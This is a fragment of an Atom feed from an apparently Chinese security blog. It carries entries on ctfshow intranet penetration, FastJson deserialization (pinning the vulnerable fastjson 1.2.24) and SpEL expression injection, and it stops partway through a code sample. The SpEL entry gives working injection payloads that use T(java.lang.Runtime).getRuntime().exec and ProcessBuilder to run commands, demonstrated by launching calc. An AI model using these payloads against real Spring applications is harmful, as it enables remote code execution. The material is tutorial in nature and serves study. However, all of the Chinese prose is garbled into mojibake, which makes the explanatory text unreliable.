    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&quot;&gt;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/thebeastofwar/p/17750376.html&quot;&gt;https://www.cnblogs.com/thebeastofwar/p/17750376.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="ctfshow" scheme="http://c1oudfl0w0.github.io/blog/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>FastJsonååºåˆ—åŒ–</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-07-19T15:25:33.000Z</published>
    <updated>2024-07-19T15:28:56.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://natro92.fun/posts/ac90d224/">https://natro92.fun/posts/ac90d224/</a></p><p><a href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://zer0peach.github.io/2023/09/24/FastJSON/">https://zer0peach.github.io/2023/09/24/FastJSON/</a></p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80">https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80</a></p><span id="more"></span><hr><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><blockquote><p>Fastjson æ˜¯ Alibaba å¼€å‘çš„ Java è¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½ JSON åº“ï¼Œç”¨äºå°†æ•°æ®åœ¨ JSON å’Œ Java Object ä¹‹é—´äº’ç›¸è½¬æ¢ã€‚</p></blockquote><p>æä¾›ä¸¤ä¸ªä¸»è¦æ¥å£æ¥åˆ†åˆ«å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚</p><p><code>JSON.toJSONString</code> å°† Java å¯¹è±¡è½¬æ¢ä¸º json å¯¹è±¡ï¼Œåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p><p><code>JSON.parseObject/JSON.parse</code> å°† json å¯¹è±¡é‡æ–°å˜å› Java å¯¹è±¡ï¼›ååºåˆ—åŒ–çš„è¿‡ç¨‹</p><p>æ‰€ä»¥å¯ä»¥ç®€å•çš„æŠŠ json ç†è§£æˆæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</p><hr><h1 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/ac90d224/&quot;&gt;https://natro92.fun/posts/ac90d224/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&quot;&gt;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/24/FastJSON/&quot;&gt;https://zer0peach.github.io/2023/09/24/FastJSON/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&quot;&gt;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SPELè¡¨è¾¾å¼æ³¨å…¥</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2024-07-19T03:59:17.000Z</published>
    <updated>2024-07-19T15:04:07.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</a></p><p><a href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><span id="more"></span><hr><h1 id="SPELè¡¨è¾¾å¼åŸºç¡€"><a href="#SPELè¡¨è¾¾å¼åŸºç¡€" class="headerlink" title="SPELè¡¨è¾¾å¼åŸºç¡€"></a>SPELè¡¨è¾¾å¼åŸºç¡€</h1><blockquote><p>åœ¨Spring 3ä¸­å¼•å…¥äº†Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpring Expression Languageï¼Œç®€ç§°SpELï¼‰ï¼Œè¿™æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œå¯ä»¥ä¸åŸºäºXMLå’ŒåŸºäºæ³¨è§£çš„Springé…ç½®è¿˜æœ‰beanå®šä¹‰ä¸€èµ·ä½¿ç”¨</p></blockquote><p>ç‰¹æ€§ï¼š</p><ul><li>ä½¿ç”¨Beançš„IDæ¥å¼•ç”¨Bean</li><li>å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§</li><li>å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®—</li><li>å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</li><li>å¯è¿›è¡Œé›†åˆæ“ä½œ</li></ul><h2 id="å®šç•Œç¬¦"><a href="#å®šç•Œç¬¦" class="headerlink" title="å®šç•Œç¬¦"></a>å®šç•Œç¬¦</h2><p><code>#&#123;&#125;</code>ï¼šæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯SpELè¡¨è¾¾å¼ï¼Œåœ¨å…¶ä¸­å¯ä»¥ä½¿ç”¨SpELè¿ç®—ç¬¦ã€å˜é‡ã€å¼•ç”¨beanåŠå…¶å±æ€§å’Œæ–¹æ³•ç­‰</p><p>å’Œ<code>$&#123;&#125;</code>çš„åŒºåˆ«ï¼š</p><ul><li><p><code>#&#123;&#125;</code>å°±æ˜¯SpELçš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹æœªSpELè¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</p></li><li><p><code>$&#123;&#125;</code>ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</p></li><li><p>ä¸¤è€…å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡»<code>#&#123;&#125;</code>åœ¨å¤–é¢ï¼Œ<code>$&#123;&#125;</code>åœ¨é‡Œé¢ï¼Œå¦‚<code>#&#123;&#39;$&#123;&#125;&#39;&#125;</code>ï¼Œæ³¨æ„å•å¼•å·æ˜¯å­—ç¬¦ä¸²ç±»å‹æ‰æ·»åŠ çš„</p></li></ul><p>ç»“è®ºï¼š<code>$&#123;&#125;</code>åªæ˜¯å•çº¯çš„ä¸€ä¸ªå ä½ç¬¦ï¼Œä¼šå¼•èµ·ä¸€äº›æ³¨å…¥ï¼Œæ¯”å¦‚SQLæ³¨å…¥ä¹‹ç±»çš„ã€‚è€Œ<code>#&#123;&#125;</code>è¿™å°±æ˜¯SPELç‰¹æœ‰çš„å®šç•Œç¬¦ã€‚ä¸­é—´çš„å†…å®¹ä¼šè¢«è§£æ</p><hr><h2 id="è¡¨è¾¾å¼ç±»å‹"><a href="#è¡¨è¾¾å¼ç±»å‹" class="headerlink" title="è¡¨è¾¾å¼ç±»å‹"></a>è¡¨è¾¾å¼ç±»å‹</h2><h3 id="å­—é¢å€¼"><a href="#å­—é¢å€¼" class="headerlink" title="å­—é¢å€¼"></a>å­—é¢å€¼</h3><p>æœ€ç®€å•çš„SpELè¡¨è¾¾å¼å°±æ˜¯ä»…åŒ…å«ä¸€ä¸ªå­—é¢å€¼ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬åœ¨XMLé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨SpELè®¾ç½®ç±»å±æ€§çš„å€¼ä¸ºå­—é¢å€¼ï¼Œæ­¤æ—¶éœ€è¦ç”¨åˆ°<code>#&#123;&#125;</code>å®šç•Œç¬¦ï¼Œæ³¨æ„è‹¥æ˜¯æŒ‡å®šä¸ºå­—ç¬¦ä¸²çš„è¯éœ€è¦æ·»åŠ å•å¼•å·æ‹¬èµ·æ¥ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;'0w0'&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿˜å¯ä»¥ç›´æ¥ä¸å­—ç¬¦ä¸²æ··ç”¨ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>the value is #&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>JavaåŸºæœ¬æ•°æ®ç±»å‹éƒ½å¯ä»¥å‡ºç°åœ¨SpELè¡¨è¾¾å¼ä¸­ï¼Œè¡¨è¾¾å¼ä¸­çš„æ•°å­—ä¹Ÿå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>salary<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;1e4&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•"><a href="#å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•" class="headerlink" title="å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•"></a>å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•</h3><p>SpEL è¡¨è¾¾å¼èƒ½å¤Ÿé€šè¿‡å…¶ä»– Bean çš„ ID è¿›è¡Œå¼•ç”¨ï¼Œç›´æ¥åœ¨ <code>#&#123;&#125;</code> ç¬¦å·ä¸­å†™å…¥ ID åå³å¯ï¼Œæ— éœ€æ·»åŠ å•å¼•å·æ‹¬èµ·æ¥</p><p>å¸¸è§„å†™æ³•ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SpELä¸­ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;test&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼•ç”¨ç±»å±æ€§å’Œå¼•ç”¨ç±»æ–¹æ³•æ‡’å¾—å†™äº†ï¼ˆ</p><hr><h3 id="å¸¸è§çš„è¡¨è¾¾å¼"><a href="#å¸¸è§çš„è¡¨è¾¾å¼" class="headerlink" title="å¸¸è§çš„è¡¨è¾¾å¼"></a>å¸¸è§çš„è¡¨è¾¾å¼</h3><p>ä¸€äº›æ¯”è¾ƒå¸¸è§çš„è¡¨è¾¾å¼ï¼š</p><table><thead><tr><th>è¿ç®—ç¬¦ç±»å‹</th><th>è¿ç®—ç¬¦</th></tr></thead><tbody><tr><td>ç®—æ•°è¿ç®—</td><td>+, -, *, &#x2F;, %, ^</td></tr><tr><td>å…³ç³»è¿ç®—</td><td>&lt;, &gt;, &#x3D;&#x3D;, &lt;&#x3D;, &gt;&#x3D;, lt, gt, eq, le, ge</td></tr><tr><td>é€»è¾‘è¿ç®—</td><td>and, or, not, !</td></tr><tr><td>æ¡ä»¶è¿ç®—</td><td>?:(ternary), ?:(Elvis)</td></tr><tr><td>æ­£åˆ™è¡¨è¾¾å¼</td><td>matches</td></tr></tbody></table><table><thead><tr><th>è¿ç®—ç¬¦</th><th>ç¬¦å·</th><th>æ–‡æœ¬ç±»å‹</th></tr></thead><tbody><tr><td>ç­‰äº</td><td>&#x3D;&#x3D;</td><td>eq</td></tr><tr><td>å°äº</td><td>&lt;</td><td>lt</td></tr><tr><td>å°äºç­‰äº</td><td>&lt;&#x3D;</td><td>le</td></tr><tr><td>å¤§äº</td><td>&gt;</td><td>gt</td></tr><tr><td>å¤§äºç­‰äº</td><td>&gt;&#x3D;</td><td>ge</td></tr></tbody></table><hr><h2 id="å˜é‡å®šä¹‰å’Œå¼•ç”¨"><a href="#å˜é‡å®šä¹‰å’Œå¼•ç”¨" class="headerlink" title="å˜é‡å®šä¹‰å’Œå¼•ç”¨"></a>å˜é‡å®šä¹‰å’Œå¼•ç”¨</h2><p>åœ¨SpELè¡¨è¾¾å¼ä¸­ï¼Œå˜é‡å®šä¹‰é€šè¿‡<code>EvaluationContext</code>ç±»çš„<code>setVariable(variableName, value)</code>å‡½æ•°æ¥å®ç°ï¼›åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨&quot;#variableName&quot;æ¥å¼•ç”¨ï¼›é™¤äº†å¼•ç”¨è‡ªå®šä¹‰å˜é‡ï¼ŒSpELè¿˜å…è®¸å¼•ç”¨æ ¹å¯¹è±¡åŠå½“å‰ä¸Šä¸‹æ–‡å¯¹è±¡ï¼š</p><ul><li>#thisï¼šä½¿ç”¨å½“å‰æ­£åœ¨è®¡ç®—çš„ä¸Šä¸‹æ–‡ï¼›</li><li>#rootï¼šå¼•ç”¨å®¹å™¨çš„rootå¯¹è±¡ï¼›</li><li>@somethingï¼šå¼•ç”¨Bean</li></ul><hr><h2 id="ç±»å‹è¡¨è¾¾å¼T"><a href="#ç±»å‹è¡¨è¾¾å¼T" class="headerlink" title="ç±»å‹è¡¨è¾¾å¼T()"></a>ç±»å‹è¡¨è¾¾å¼T()</h2><blockquote><p>åœ¨ SpEL è¡¨è¾¾å¼ä¸­ï¼Œä½¿ç”¨ <code>T(Type)</code> è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»çš„ä½œç”¨åŸŸå’Œæ–¹æ³•ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å¯ä»¥é€šè¿‡è¯¥ç±»ç±»å‹è¡¨è¾¾å¼æ¥æ“ä½œç±»ã€‚</p></blockquote><p>ä½¿ç”¨ <code>T(Type)</code> æ¥è¡¨ç¤º <code>java.lang.Class</code> å®ä¾‹ï¼ŒType å¿…é¡»æ˜¯ç±»å…¨é™å®šåï¼Œä½† <code>java.lang</code> åŒ…é™¤å¤–ï¼Œå› ä¸º SpEL å·²ç»å†…ç½®äº†è¯¥åŒ…ï¼Œå³è¯¥åŒ…ä¸‹çš„ç±»å¯ä»¥ä¸æŒ‡å®šå…·ä½“çš„åŒ…åï¼›ä½¿ç”¨ç±»ç±»å‹è¡¨è¾¾å¼è¿˜å¯ä»¥è¿›è¡Œè®¿é—®ç±»é™æ€æ–¹æ³•å’Œç±»é™æ€å­—æ®µ</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>java.lang.Runtime</code> è¿™ä¸ªåŒ…ä¹Ÿæ˜¯åŒ…å«äº <code>java.lang</code> çš„åŒ…çš„ï¼Œæ‰€ä»¥å¦‚æœèƒ½è°ƒç”¨ <code>Runtime</code> å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.String)"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ‰§è¡Œ</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719145300158.png" alt="image-20240719145300158"></p><p>Tä¸­çš„å†…å®¹ä¼šè¢«è§£æä¸ºä¸€ä¸ªç±»ã€‚æ¯”å¦‚å›¾ä¸­çš„Stringï¼Œé‚£ä¹ˆå½“ç„¶å¯ä»¥è§£æä¸º<code>java.lang.Runtime</code>ï¼Œå› æ­¤ä¹Ÿå°±æœ‰äº†å‘½ä»¤æ‰§è¡Œ</p><p>åªéœ€è¦æ”¹ä¸º<code>T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)</code>å°±èƒ½å¼¹è®¡ç®—å™¨</p><hr><h1 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h1><h2 id="RCE-ver1â€”â€”ç›´æ¥RCE"><a href="#RCE-ver1â€”â€”ç›´æ¥RCE" class="headerlink" title="RCE ver1â€”â€”ç›´æ¥RCE"></a>RCE ver1â€”â€”ç›´æ¥RCE</h2><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.lang.ProcessBuilder(new String[]&#123;\"calc\"&#125;).start()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719150401829.png" alt="image-20240719150401829"></p><hr><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token 